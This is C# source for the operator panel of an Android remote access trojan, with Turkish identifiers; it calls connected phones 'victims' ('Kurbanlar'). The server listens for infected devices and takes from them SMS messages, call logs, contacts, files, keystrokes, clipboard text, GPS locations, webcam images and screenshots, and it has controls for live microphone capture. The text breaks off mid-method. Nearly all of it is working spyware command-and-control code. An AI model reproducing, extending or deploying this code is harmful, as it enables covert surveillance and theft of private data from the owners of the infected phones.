using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;                                 //MADE IN TURKEY//
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SV
{
    public partial class Form1 : Form
    {
        List<Kurbanlar> kurban_listesi = new List<Kurbanlar>(); //Kurban (Client) listemiz.
        Socket soketimiz = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        private byte[] bafirimiz = new byte[short.MaxValue];
        public Form1()
        {
            InitializeComponent();
            if (new Port().ShowDialog() == DialogResult.OK)
            {
                Dinle();
            }
            else
            {
                Environment.Exit(0);
            }
            dizin_yukari.ImageIndex = 13;
            dizin_yukari_.ImageIndex = 13;
        }

       
        public static int port_no = 9999;
        public void Dinle()
        {
            try
            {
                soketimiz = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                soketimiz.Bind(new IPEndPoint(IPAddress.Any, port_no));
                toolStripStatusLabel1.Text = "Port: " + port_no.ToString();
                soketimiz.Listen(int.MaxValue);
                soketimiz.BeginAccept(new AsyncCallback(Client_Kabul), null);
            }
            catch (Exception ex) { MessageBox.Show(ex.Message); }
        }

        void Client_Kabul(IAsyncResult ar)
        {
            try
            {
                Socket sock = soketimiz.EndAccept(ar);
                sock.BeginReceive(bafirimiz, 0, bafirimiz.Length, SocketFlags.None, new AsyncCallback(Client_Bilgi_Al), sock);
                soketimiz.BeginAccept(new AsyncCallback(Client_Kabul), null); //Tekrar client alımı için.
            }
            catch (Exception)
            {
            }
        }
        public static int topOf = 0;

        public async void Ekle(Socket socettte, string idimiz, string makine_ismi,
            string ulke_dil, string uretici_model, string android_ver)
        {
            kurban_listesi.Add(new Kurbanlar(socettte, idimiz));
            ListViewItem lvi = new ListViewItem(idimiz);
            lvi.SubItems.Add(makine_ismi);
            lvi.SubItems.Add(socettte.RemoteEndPoint.ToString());
            lvi.SubItems.Add(ulke_dil);
            lvi.SubItems.Add(uretici_model);
            lvi.SubItems.Add(android_ver);
            
            if (File.Exists(Environment.CurrentDirectory + "\\Klasörler\\Bayraklar\\" + ulke_dil.Split('/')[1] + ".png"))
            {
                lvi.ImageKey = ulke_dil.Split('/')[1] + ".png";
            }
            listView1.Items.Add(lvi);         
            if(File.Exists(Environment.CurrentDirectory + "\\Klasörler\\Bayraklar\\" + ulke_dil.Split('/')[1] + ".png")){
                new Bildiri(makine_ismi, uretici_model,android_ver,
                Image.FromFile(Environment.CurrentDirectory + "\\Klasörler\\Bayraklar\\" + ulke_dil.Split('/')[1] + ".png")).Show();
            }
            else
            {
                new Bildiri(makine_ismi, uretici_model, android_ver, Image.FromFile(Environment.CurrentDirectory + "\\Klasörler\\Bayraklar\\-1.png")).Show();
            }
            toolStripStatusLabel2.Text = "Online: " + listView1.Items.Count.ToString();
            await Task.Delay(1);
            topOf += 125;
            
        }
        public static Image ByteToImage(byte[] blob)
        {
            return (Bitmap)new ImageConverter().ConvertFrom(blob);
        }
        ListViewItem dizin_yukari = new ListViewItem("...");
        ListViewItem dizin_yukari_ = new ListViewItem("...");
        public void DownloadFile(Socket socket, byte[] buffer, int offset, int size, int timeout, string filename)
        {
            Invoke((MethodInvoker)delegate { 
            Yuzde yzd = new Yuzde();
            yzd.Show();
                //int startTickCount = Environment.TickCount;
                int received = 0;
                do
                {
                    //if (Environment.TickCount > startTickCount + timeout)
                    //  throw new Exception("Timeout.");
                    try
                    {
                        received += socket.Receive(buffer, offset + received, size - received, SocketFlags.None);
                        try
                        {
                            Application.DoEvents();
                            decimal max_ = size;
                            decimal receiv = received;
                            int per = Convert.ToInt32((receiv / max_) * 100);
                            yzd.progressBar1.Value = per;
                            yzd.label1.Text = "Alınıyor %" + per.ToString();
                            yzd.label2.Text = "İşlemdeki Dosya: " + filename;
                            yzd.label3.Text = received.ToString() + "/" + size.ToString();
                        }
                        catch (Exception) { }
                    }
                    catch (SocketException ex)
                    {
                            if (ex.SocketErrorCode == SocketError.WouldBlock ||
                                ex.SocketErrorCode == SocketError.IOPending ||
                                ex.SocketErrorCode == SocketError.NoBufferSpaceAvailable)
                            {
                                Thread.Sleep(30);
                            }
                            else
                            { yzd.Close(); break; }
                    }
                } while (received < size);
                yzd.Close();
            });
        }
        void Client_Bilgi_Al(IAsyncResult ar)
        {
            try
            {
                SocketError errorCode = default;
                Socket soket2 = (Socket)ar.AsyncState;
                int uzunluk = soket2.EndReceive(ar, out errorCode);
                string veri = Encoding.UTF8.GetString(bafirimiz, 0, uzunluk);
                string[] s = veri.Split('|');
                switch (s[0])
                {
                    case "IP":
                        Invoke((MethodInvoker)delegate
                        {
                            Ekle(soket2, soket2.Handle.ToString(), s[1], s[2], s[3], s[4]);                         
                        });
                        break;
                    case "CAMNOT":
                        Invoke((MethodInvoker)delegate
                        {
                            FİndKameraById(soket2.Handle.ToString()).label1.Visible = true;
                            FİndKameraById(soket2.Handle.ToString()).label4.Text = "Alınamadı %0";
                            FİndKameraById(soket2.Handle.ToString()).progressBar1.Value = 0;
                            FİndKameraById(soket2.Handle.ToString()).button1.Enabled = true;
                            //FİndKameraById(soket2.Handle.ToString()).label2.Visible = false;
                        });
                        break;
                    case "SMSLOGU":
                        try
                        {
                            var rex = Regex.Match(s[1], "#[0-9]+#");
                            string replaced = rex.Value.Replace("#", "");
                            byte[] gelen_sms = new byte[int.Parse(replaced)];
                            s[1] = s[1].Replace(rex.Value, "");
                            Receive(soket2, gelen_sms, 0, gelen_sms.Length, 59999);
                            string ok = Encoding.UTF8.GetString(gelen_sms);
                            FindSMSFormById(soket2.Handle.ToString()).listView1.Items.Clear();
                            if (ok != "SMS YOK")
                            {
                                string[] ana_Veriler = ok.Split('&');
                                for (int k = 0; k < ana_Veriler.Length; k++)
                                {
                                    try
                                    {
                                        string[] bilgiler = ana_Veriler[k].Split('{');
                                        ListViewItem item = new ListViewItem(bilgiler[0]);
                                        item.ImageIndex = 0;
                                        item.SubItems.Add(bilgiler[4]);
                                        item.SubItems.Add(bilgiler[1]);
                                        item.SubItems.Add(bilgiler[2]);
                                        item.SubItems.Add(bilgiler[3]);
                                        FindSMSFormById(soket2.Handle.ToString()).listView1.Items.Add(item);
                                    }
                                    catch (Exception) { }
                                }
                            }
                            else
                            {
                                ListViewItem item = new ListViewItem("SMS Yok.");
                                FindSMSFormById(soket2.Handle.ToString()).listView1.Items.Add(item);
                            }
                        }
                        catch (Exception ex) { FindSMSFormById(soket2.Handle.ToString()).Text = "Sms Yöneticisi " + ex.Message; }
                        break;
                    case "CAGRIKAYITLARI":
                        try
                        {
                            var rex = Regex.Match(s[1], "#[0-9]+#");
                            string replaced = rex.Value.Replace("#", "");
                            byte[] gelen_veri = new byte[int.Parse(replaced)];
                            s[1] = s[1].Replace(rex.Value, "");
                            Receive(soket2, gelen_veri, 0, gelen_veri.Length, 59999);
                            string ok__ = Encoding.UTF8.GetString(gelen_veri);
                            FindCagriById(soket2.Handle.ToString()).listView1.Items.Clear();
                            if (ok__ != "CAGRI YOK")
                            {
                                string[] ana_Veriler = ok__.Split('&');
                                for (int k = 0; k < ana_Veriler.Length; k++)
                                {
                                    try
                                    {
                                        string[] bilgiler = ana_Veriler[k].Split('=');
                                        ListViewItem item = new ListViewItem(bilgiler[0]);
                                        item.SubItems.Add(bilgiler[1]);
                                        item.SubItems.Add(bilgiler[2]);
                                        item.SubItems.Add(bilgiler[3]);
                                        item.SubItems.Add(bilgiler[4]);
                                        switch (bilgiler[4])
                                        {
                                            case "GELEN_TELEFON":
                                                item.ImageIndex = 1;
                                                break;
                                            case "GİDEN_TELEFON":
                                                item.ImageIndex = 3;
                                                break;
                                            case "CEVAPSIZ_ARAMA":
                                                item.ImageIndex = 2;
                                                break;
                                            case "REDDEDİLMİŞ_ARAMA":
                                                item.ImageIndex = 0;
                                                break;
                                            case "KARA_LİSTE_ARAMA":
                                                item.ImageIndex = 0;
                                                break;
                                        }
                                        FindCagriById(soket2.Handle.ToString()).listView1.Items.Add(item);
                                    }
                                    catch (Exception) { }
                                }
                            }
                            else
                            {
                                ListViewItem item = new ListViewItem("Çağrı Yok.");
                                FindCagriById(soket2.Handle.ToString()).listView1.Items.Add(item);
                            }
                        }
                        catch (Exception ex) { FindCagriById(soket2.Handle.ToString()).Text = "Çağrı Kayıtları " + ex.Message; }
                        break;
                    case "REHBER":
                        try
                        {
                            var rex = Regex.Match(s[1], "#[0-9]+#");
                            string replaced = rex.Value.Replace("#", "");
                            byte[] gelen_rehber = new byte[int.Parse(replaced)];
                            s[1] = s[1].Replace(rex.Value, "");
                            Receive(soket2, gelen_rehber, 0, gelen_rehber.Length, 59999);
                            string _ok = Encoding.UTF8.GetString(gelen_rehber);
                            FindRehberById(soket2.Handle.ToString()).listView1.Items.Clear();
                            if (_ok != "REHBER YOK")
                            {
                                string[] ana_Veriler = _ok.Split('&');
                                for (int k = 0; k < ana_Veriler.Length; k++)
                                {
                                    try
                                    {
                                        string[] bilgiler = ana_Veriler[k].Split('=');
                                        ListViewItem item = new ListViewItem(bilgiler[0]);
                                        item.ImageIndex = 0;
                                        item.SubItems.Add(bilgiler[1]);
                                        FindRehberById(soket2.Handle.ToString()).listView1.Items.Add(item);
                                    }
                                    catch (Exception) { }
                                }
                            }
                            else
                            {
                                ListViewItem item = new ListViewItem("Rehber Yok.");
                                FindRehberById(soket2.Handle.ToString()).listView1.Items.Add(item);
                            }
                        }
                        catch (Exception ex) { FindRehberById(soket2.Handle.ToString()).Text = "Rehber " + ex.Message; }
                        break;
                    case "APPS":
                        FindUygulamalarById(soket2.Handle.ToString()).listView1.Items.Clear();
                        string[] ana_Veriler_ = s[1].Split('&');
                        for (int k = 0; k < ana_Veriler_.Length; k++)
                        {
                            try
                            {
                                string[] bilgiler = ana_Veriler_[k].Split('=');
                                ListViewItem item = new ListViewItem(bilgiler[0]);
                                item.SubItems.Add(bilgiler[1]);
                                /*
                                if (bilgiler[2] != "[NULL]")
                                {
                                    try
                                    {
                                        FindUygulamalarById(soket2.Handle.ToString()).ımageList1.Images.Add(bilgiler[1],
                                            Base64ToImage(bilgiler[2]));
                                        item.ImageKey = bilgiler[1];
                                    }
                                    catch(Exception ex ) { MessageBox.Show(bilgiler[2]); }
                                }
                                else
                                {
                                    MessageBox.Show("NULL");
                                }
                                */
                                FindUygulamalarById(soket2.Handle.ToString()).listView1.Items.Add(item);
                            }
                            catch (Exception) { }
                        }
                        break;
                    case "DOSYAALINDI":
                        MessageBox.Show(FindFileManagerById(soket2.Handle.ToString()), "İsimli kurbanınızda dosya başarılı bir şekilde kaydedildi.", s[1], MessageBoxButtons.OK, MessageBoxIcon.Information);
                        break;
                    case "WEBCAM":
                        try
                        {
                            var _regex_File__ = Regex.Match(s[1], "[0-9]+");
                            FİndKameraById(soket2.Handle.ToString()).label2.Text = "Çekildi.";
                          
                            byte[] bito = new byte[int.Parse(_regex_File__.Value)];
                            s[1] = s[1].Replace(_regex_File__.Value, "");
                            FİndKameraById(soket2.Handle.ToString()).Receive(soket2,bito,0,bito.Length,5999);
                            try
                            {
                                FİndKameraById(soket2.Handle.ToString()).pictureBox1.Image = (Bitmap)((new ImageConverter()).ConvertFrom(Decompress(bito)));//Image.FromStream(ms);
                                FİndKameraById(soket2.Handle.ToString()).label4.Text = "Alındı %" +
                                    FİndKameraById(soket2.Handle.ToString()).progressBar1.Value.ToString();
                                FİndKameraById(soket2.Handle.ToString()).button1.Enabled = true;
                            }
                            catch (Exception ex) { MessageBox.Show(ex.Message); }
                        }
                        catch (Exception ex)
                        {
                            MessageBox.Show(ex.Message);
                            FİndKameraById(soket2.Handle.ToString()).Text = "Kamera " + ex.Message;
                        }
                        break;
                    case "FILES":
                        Invoke((MethodInvoker)delegate
                        {
                            try
                            {
                                switch (s[1])
                                {
                                    case "IKISIDE":
                                        FindFileManagerById(soket2.Handle.ToString()).listView1.Items.Clear();
                                        FindFileManagerById(soket2.Handle.ToString()).listView2.Items.Clear();
                                        break;
                                    case "CIHAZ":
                                        FindFileManagerById(soket2.Handle.ToString()).listView1.Items.Clear();

                                        break;
                                    case "SDCARD":
                                        FindFileManagerById(soket2.Handle.ToString()).listView2.Items.Clear();
                                        break;
                                }

                                try { FindFileManagerById(soket2.Handle.ToString()).listView1.Items.Add(dizin_yukari); } catch (Exception) { }
                                try { FindFileManagerById(soket2.Handle.ToString()).listView2.Items.Add(dizin_yukari_); } catch (Exception) { }

                                var rex = Regex.Match(s[2], "#[0-9]+#");
                                string replaced = rex.Value.Replace("#", "");
                                byte[] dosyaya_yazilacaklar = new byte[int.Parse(replaced)];
                                if (dosyaya_yazilacaklar.Length < 1)
                                {

                                    switch (s[1])
                                    {
                                        case "IKISIDE":
                                            FindFileManagerById(soket2.Handle.ToString()).listView1.BackgroundImageLayout = ImageLayout.Zoom;
                                            FindFileManagerById(soket2.Handle.ToString()).listView1.BackgroundImage =
                                            Properties.Resources.nothing;
                                            FindFileManagerById(soket2.Handle.ToString()).listView2.BackgroundImageLayout = ImageLayout.Zoom;
                                            FindFileManagerById(soket2.Handle.ToString()).listView2.BackgroundImage =
                                            Properties.Resources.nothing;
                                            break;
                                        case "CIHAZ":
                                            FindFileManagerById(soket2.Handle.ToString()).listView1.BackgroundImageLayout = ImageLayout.Zoom;
                                            FindFileManagerById(soket2.Handle.ToString()).listView1.BackgroundImage =
                                            Properties.Resources.nothing;
                                            break;
                                        case "SDCARD":
                                            FindFileManagerById(soket2.Handle.ToString()).listView2.BackgroundImageLayout = ImageLayout.Zoom;
                                            FindFileManagerById(soket2.Handle.ToString()).listView2.BackgroundImage =
                                            Properties.Resources.nothing;
                                            break;

                                    }
                                    return;
                                }

                                Receive(soket2, dosyaya_yazilacaklar, 0, dosyaya_yazilacaklar.Length, 59999);
                                string son_veri = Encoding.UTF8.GetString(dosyaya_yazilacaklar);
                                File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
                                    + "\\files.txt", son_veri);

                                Invoke((MethodInvoker)delegate { 
                                string[] lines = File.ReadAllLines(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
                                    + "\\files.txt");
                                for (int i = 0; i < lines.Length; i++)
                                {
                                    string[] parse = lines[i].Split('=');
                                    try
                                    {
                                        Application.DoEvents();
                                        ListViewItem lv = new ListViewItem(parse[0]);
                                        lv.SubItems.Add(parse[1]);
                                        lv.SubItems.Add(parse[2]);
                                        lv.SubItems.Add(parse[3]);
                                        lv.SubItems.Add(parse[4]);
                                        if (parse[2] == "")
                                        {
                                            lv.ImageIndex = 0;
                                        }
                                        else
                                        {
                                            switch (parse[2].ToLower())
                                            {
                                                case ".txt":
                                                    lv.ImageIndex = 11;
                                                    break;
                                                case ".apk":
                                                    lv.ImageIndex = 1;
                                                    break;
                                                case ".jpeg":
                                                case ".jpg":
                                                case ".png":
                                                case ".gif":
                                                    lv.ImageIndex = 4;
                                                    break;
                                                case ".avi":
                                                case ".mp4":
                                                case ".flv":
                                                case ".mkv":
                                                case ".wmv":
                                                case ".mpg":
                                                case ".mpeg":
                                                    lv.ImageIndex = 7;
                                                    break;
                                                case ".mp3":
                                                case ".wav":
                                                case ".ogg":
                                                    lv.ImageIndex = 6;
                                                    break;
                                                case ".rar":
                                                case ".zip":
                                                    lv.ImageIndex = 8;
                                                    break;
                                                case ".pdf":
                                                    lv.ImageIndex = 10;
                                                    break;
                                                case ".html":
                                                case ".htm":
                                                    lv.ImageIndex = 9;
                                                    break;
                                                case ".doc":
                                                case ".docx":
                                                    lv.ImageIndex = 2;
                                                    break;
                                                case ".xlsx":
                                                    lv.ImageIndex = 3;
                                                    break;
                                                case ".pptx":
                                                    lv.ImageIndex = 5;
                                                    break;
                                                default:
                                                    lv.ImageIndex = 12;
                                                    break;
                                            }
                                        }
                                        if (parse[4] == "CİHAZ")
                                        {
                                            FindFileManagerById(soket2.Handle.ToString()).listView1.Items.Add(lv);
                                            FindFileManagerById(soket2.Handle.ToString()).textBox1.Text = parse[5];

                                        }
                                        else
                                        {
                                            if (parse[4] == "SDCARD")
                                            {
                                                FindFileManagerById(soket2.Handle.ToString()).listView2.Items.Add(lv);
                                                FindFileManagerById(soket2.Handle.ToString()).textBox2.Text = parse[5];

                                            }
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                        MessageBox.Show("S1: " + s[1] + "  S2:" + s[2], "iç");
                                        FindFileManagerById(soket2.Handle.ToString()).Text = "Dosya Yöneticisi - Hata: " + ex.Message;
                                    }
                                }
                                });
                            }
                            catch (Exception ex)
                            {
                                FindFileManagerById(soket2.Handle.ToString()).Text = "Dosya Yöneticisi " + ex.Message;
                            }
                        });

                        break;
                    case "UZUNLUK":
                        var regex_File = Regex.Match(s[1], "[0-9]+");
                        var bt2 = new byte[int.Parse(regex_File.Value)];
                        s[1] = s[1].Replace(regex_File.Value, "");
                        DownloadFile(soket2, bt2, 0, bt2.Length, 59999, s[2]);
                        if (!Directory.Exists(Environment.CurrentDirectory + "\\Klasörler\\İndirilenler\\" + s[3]))
                        {
                            Directory.CreateDirectory(Environment.CurrentDirectory + "\\Klasörler\\İndirilenler\\" + s[3]);
                        }
                        try
                        {
                            File.WriteAllBytes(Environment.CurrentDirectory + "\\Klasörler\\İndirilenler\\" + s[3] + "\\"
                                + s[2], bt2);
                        }
                        catch (Exception ex) { MessageBox.Show(ex.Message); }
                        try
                        {
                            MessageBox.Show(FindFileManagerById(soket2.Handle.ToString()), "Dosya indi", "İndirme Tamamlandı", MessageBoxButtons.OK,
                                MessageBoxIcon.Information);
                        }
                        catch (Exception) { }
                        break;
                    case "CHAR":
                        FindKeyloggerManagerById(soket2.Handle.ToString()).textBox1.Text += s[1].Replace("[NEW_LINE]", Environment.NewLine)
                        + Environment.NewLine;
                        break;
                    case "LOGDOSYA":
                        try
                        {
                            if (s[1] == "LOG_YOK")
                            {
                                FindKeyloggerManagerById(soket2.Handle.ToString()).comboBox1.Items.Add("Log yok.");
                            }
                            else
                            {
                                var regEx = Regex.Match(s[1], "#[0-9]+#");
                                var bt = new byte[int.Parse(regEx.Value.Replace("#", ""))];
                                s[1] = s[1].Replace(regEx.Value, "");
                                Receive(soket2, bt, 0, bt.Length, 59999);
                                string ok = Encoding.UTF8.GetString(bt);
                                string[] ayristir = ok.Split('=');
                                for (int i = 0; i < ayristir.Length; i++)
                                {
                                    FindKeyloggerManagerById(soket2.Handle.ToString()).comboBox1.Items.Add(ayristir[i]);
                                }
                            }
                        }
                        catch (Exception) { }
                        break;
                    case "KEYGONDER":
                        var regEx_ = Regex.Match(s[1], "#[0-9]+#");
                        var bt_ = new byte[int.Parse(regEx_.Value.Replace("#", ""))];
                        s[1] = s[1].Replace(regEx_.Value, "");
                        Receive(soket2, bt_, 0, bt_.Length, 59999);
                        string ok_ = Encoding.UTF8.GetString(bt_);
                        FindKeyloggerManagerById(soket2.Handle.ToString()).textBox2.Text = ok_.Replace("[NEW_LINE]", Environment.NewLine);
                        break;

                    case "SESBILGILERI":
                        string[] ayristir_ = s[1].Split('=');
                        try
                        {
                            FindAyarlarById(soket2.Handle.ToString()).trackBar1.Maximum = int.Parse(ayristir_[0].Split('/')[1]);
                            FindAyarlarById(soket2.Handle.ToString()).trackBar1.Value = int.Parse(ayristir_[0].Split('/')[0]);
                            FindAyarlarById(soket2.Handle.ToString()).groupBox1.Text = "Zil Sesi " + ayristir_[0];
                            //
                            if (ayristir_[0].Split('/')[0] == "0") { FindAyarlarById(soket2.Handle.ToString()).groupBox3.Enabled = false; }
                            else { FindAyarlarById(soket2.Handle.ToString()).groupBox3.Enabled = true; }
                            //
                            FindAyarlarById(soket2.Handle.ToString()).trackBar2.Maximum = int.Parse(ayristir_[1].Split('/')[1]);
                            FindAyarlarById(soket2.Handle.ToString()).trackBar2.Value = int.Parse(ayristir_[1].Split('/')[0]);
                            FindAyarlarById(soket2.Handle.ToString()).groupBox2.Text = "Medya " + ayristir_[1];
                            //
                            FindAyarlarById(soket2.Handle.ToString()).trackBar3.Maximum = int.Parse(ayristir_[2].Split('/')[1]);
                            FindAyarlarById(soket2.Handle.ToString()).trackBar3.Value = int.Parse(ayristir_[2].Split('/')[0]);
                            FindAyarlarById(soket2.Handle.ToString()).groupBox3.Text = "Bildirim " + ayristir_[2];
                        }
                        catch (Exception ex) { MessageBox.Show(ex.Message); }
                        break;
                    case "TELEFONBILGI":
                        //MessageBox.Show("telefon bilgi " + s[1]);
                        FindBilgiById(soket2.Handle.ToString()).progressBar1.Value = int.Parse(s[1].Replace("%", ""));
                        FindBilgiById(soket2.Handle.ToString()).label1.Text = "Şarj seviyesi: %" + s[1];
                        FindBilgiById(soket2.Handle.ToString()).label2.Text = "Kilit Durumu: " + s[2].Split('&')[0];
                        FindBilgiById(soket2.Handle.ToString()).label3.Text = "Ekran Durumu: " + s[2].Split('&')[1];
                        FindBilgiById(soket2.Handle.ToString()).label4.Text = "Güç Kaynağı: " + s[3];
                        break;
                    case "PANOGELDI":
                        try
                        {
                            var rex = Regex.Match(s[1], "#[0-9]+#");
                            string replaced = rex.Value.Replace("#", "");
                            byte[] pano = new byte[int.Parse(replaced)];
                            s[1] = s[1].Replace(rex.Value, "");
                            Receive(soket2, pano, 0, pano.Length, 59999);
                            string icerik = Encoding.UTF8.GetString(pano);
                            if (icerik != "[NULL]")
                            {
                                FindTelephonFormById(soket2.Handle.ToString()).textBox4.Text = icerik;
                            }
                            else
                            {
                                FindTelephonFormById(soket2.Handle.ToString()).textBox4.Text = string.Empty;
                            }
                        }
                        catch (Exception) { }
                        break;
                    case "WALLPAPERBYTES":
                        try
                        {
                            var regEx_Wall = Regex.Match(s[1], "[0-9]+");
                            byte[] kvp = new byte[int.Parse(regEx_Wall.Value)];
                            s[1] = s[1].Replace(regEx_Wall.Value, "");
                            Receive(soket2, kvp, 0, kvp.Length, 59999);
                            FindTelephonFormById(soket2.Handle.ToString()).pictureBox1.Image = imeyc(kvp);
                        }
                        catch (Exception) { }
                        break;
                    case "LOCATION":
                        FindKonumById(soket2.Handle.ToString()).richTextBox1.Text = string.Empty;
                        string[] ayr = s[1].Split('=');
                        for (int i = 0; i < ayr.Length; i++)
                        {
                            if (ayr[i].Contains("{"))
                            {
                                string[] url = ayr[i].Split('{');
                                //http://maps.google.com/maps?q=24.197611,120.780512
                                ayr[i] = $"http://maps.google.com/maps?q={url[0].Replace(','.ToString(), '.'.ToString())},{url[1].Replace(','.ToString(), '.'.ToString())}";
                            }
                            FindKonumById(soket2.Handle.ToString()).richTextBox1.Text += ayr[i] + Environment.NewLine;                         
                        }
                        //FindKonumById(soket2.Handle.ToString()).richTextBox1.Text += ayr[ayr.Length - 1];
                        break;
                    case "PARLAKLIK":
                        try
                        {
                            //FindEglenceById(soket2.Handle.ToString()).trackBar1.Value = Convert.ToInt32(s[1]);
                            //FindEglenceById(soket2.Handle.ToString()).groupBox6.Text = "Parlaklık: " + s[1];
                        }
                        catch (Exception ex) { MessageBox.Show(ex.Message, s[1]); }
                        break;
                    case "ARAMA":
                        try
                        {
                            ListViewItem lvi = listView1.Items.Cast<ListViewItem>().Where(items => items.Text ==
                            soket2.Handle.ToString()).First();
                            Invoke((MethodInvoker)delegate
                            {
                                new YeniArama(s[1].Split('=')[1], s[1].Split('=')[0], lvi.SubItems[1].Text).Show();
                            });
                            //MessageBox.Show(s[1].Split('=')[0], s[1].Split('=')[1]);
                        }
                        catch (Exception) { }
                        break;
                    case "INDIRILDI":
                        var window = FindDownloadManagerById(soket2.Handle.ToString());
                        MessageBox.Show(window, s[1], "Dosyanızın İndirtme Sonucu", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        break;
                    case "SCREENSHOT":
                        MessageBox.Show("geldi");
                        FindEkranGoruntusuById(soket2.Handle.ToString()).max = int.Parse(s[1]);
                        FindEkranGoruntusuById(soket2.Handle.ToString()).resim();
                        break;
                }
                soket2.BeginReceive(bafirimiz, 0, bafirimiz.Length, SocketFlags.None, new AsyncCallback(Client_Bilgi_Al), soket2);
            }
            catch (SocketException)
            {

            }
        }
        FİleManager fmanger;
        public Image imeyc(byte[] input)
        {
            using (var ms = new MemoryStream(input))
            {
                return Image.FromStream(ms);
            }
        }
        public Image Base64ToImage(string base64String)
        {
            byte[] imageBytes = Convert.FromBase64String(base64String);
            using (var ms = new MemoryStream(imageBytes, 0, imageBytes.Length))
            {
                Image image = Image.FromStream(ms, true);
                return image;
            }
        }
        public static byte[] Decompress(byte[] data)
        {
            using (MemoryStream input = new MemoryStream(data))
            {
                using (MemoryStream output = new MemoryStream())
                {
                    using (DeflateStream dstream = new DeflateStream(input, CompressionMode.Decompress))
                    {
                        dstream.CopyTo(output);
                    }
                    return output.ToArray();
                }
            }
        }

        public static void Receive(Socket socket, byte[] buffer, int offset, int size, int timeout)
        {
            try
            {
                //int startTickCount = Environment.TickCount;
                int received = 0;
                do
                {
                    //if (Environment.TickCount > startTickCount + timeout)
                    //  throw new Exception("Timeout.");
                    try
                    {
                        received += socket.Receive(buffer, offset + received, size - received, SocketFlags.None);
                        /*
                        try
                        {
                            yzd.label3.Text = received.ToString() + "/" + size.ToString();
                            yzd.label1.Text = ((100 / size) * received).ToString();
                            yzd.progressBar1.Value = ((100 / size) * received);
                            yzd.label2.Text = "İşlemdeki Dosya: ...";
                        }
                        catch (Exception) { }
                        */
                    }
                    catch (SocketException ex)
                    {
                        if (ex.SocketErrorCode == SocketError.WouldBlock ||
                            ex.SocketErrorCode == SocketError.IOPending ||
                            ex.SocketErrorCode == SocketError.NoBufferSpaceAvailable)
                        {
                            Thread.Sleep(30);
                        }
                        else
                        { break; }
                    }
                } while (received < size);
            }
            catch (Exception) { }
        }
        //Kamera msj = default;
        private void mesajYollaToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Kurbanlar kurban in kurban_listesi)
            {
                if (kurban.id == listView1.SelectedItems[0].Text)
                {
                    Kamera msj = new Kamera(kurban.soket, kurban.id);
                    msj.Show();
                }
            }
        }
        // BENİM RAHAT ETMEDİĞİM DÜNYADA KİMSE İSTİRAHAT EDEMEZ.
        // https://www.youtube.com/watch?v=EOn9rRSdBNU
        private void timer1_Tick(object sender, EventArgs e)
        {
            foreach (Kurbanlar kurbanlar in kurban_listesi.ToList())
            {
                try
                {
                    kurbanlar.soket.Send(Encoding.UTF8.GetBytes("0x0F"));
                }
                catch (SocketException)
                {
                    listView1.Items.Cast<ListViewItem>().Where(y => y.Text == kurbanlar.id).First().Remove();
                    (kurban_listesi.Where(x => x.id == kurbanlar.id).First()).soket.Close();
                    (kurban_listesi.Where(x => x.id == kurbanlar.id).First()).soket.Dispose();
                    kurban_listesi.Remove(kurban_listesi.Where(x => x.id == kurbanlar.id).First());
                    toolStripStatusLabel2.Text = "Online: " + listView1.SelectedItems.Count.ToString();
                }
            }
        }
        private void bağlantıyıKapatToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        fmanger = new FİleManager(kurban.soket, kurban.id);
                        fmanger.Show();
                        byte[] veri = Encoding.UTF8.GetBytes("DOSYA|");
                        Gonderici.Send(kurban.soket, veri, 0, veri.Length, 59999);

                    }
                }
            }
        }
        private void masaustuİzleToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        Telefon tlf = new Telefon(kurban.soket, kurban.id);
                        tlf.Show();
                    }
                }
            }
        }
        private void canlıMikrofonToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        Mikrofon masaustu = new Mikrofon(kurban.soket);
                        masaustu.Show();
                    }
                }
            }
        }
        private void keyloggerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        Keylogger keylog = new Keylogger(kurban.soket, kurban.id);
                        keylog.Show();
                        byte[] veri = Encoding.UTF8.GetBytes("LOGLARIHAZIRLA|");
                        Gonderici.Send(kurban.soket, veri, 0, veri.Length, 59999);
                    }
                }
            }
        }
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Environment.Exit(0);
        }
        public EkranGoruntusu FindEkranGoruntusuById(string ident)
        {
            var list = Application.OpenForms
          .OfType<EkranGoruntusu>()
          .Where(form => string.Equals(form.ID, ident))
           .ToList();
            return list.First();
        }
        public Telefon FindTelephonFormById(string ident)
        {
            var list = Application.OpenForms
          .OfType<Telefon>()
          .Where(form => string.Equals(form.uniq_id, ident))
           .ToList();
            return list.First();
        }
        public Rehber FindRehberById(string ident)
        {
            var list = Application.OpenForms
          .OfType<Rehber>()
          .Where(form => string.Equals(form.ID, ident))
           .ToList();
            return list.First();
        }
        public SMSYoneticisi FindSMSFormById(string ident)
        {
            var list = Application.OpenForms
          .OfType<SMSYoneticisi>()
          .Where(form => string.Equals(form.uniq_id, ident))
           .ToList();
            return list.First();
        }
        public FİleManager FindFileManagerById(string ident)
        {
            var list = Application.OpenForms
          .OfType<FİleManager>()
          .Where(form => string.Equals(form.ID, ident))
           .ToList();
            return list.First();
        }
        public Keylogger FindKeyloggerManagerById(string ident)
        {
            var list = Application.OpenForms
          .OfType<Keylogger>()
          .Where(form => string.Equals(form.ID, ident))
           .ToList();
